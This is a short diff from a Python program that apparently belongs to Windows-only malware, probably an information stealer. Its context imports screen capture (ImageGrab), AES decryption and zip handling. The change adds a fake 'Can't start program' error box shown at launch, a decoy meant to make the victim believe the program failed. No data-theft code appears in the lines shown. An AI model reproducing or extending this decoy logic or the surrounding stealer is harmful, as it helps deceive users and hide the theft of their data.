@@ -35,10 +35,13 @@ from zipfile import ZipFile
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 import platform
+import pymsgbox
     
 
 if platform.system() != "Windows":
     exit()
+
+pymsgbox.alert('Can\'t start program. Error code 0x702AF38', 'Error', 'OK')
 
 
 def writeforfile(data, name):
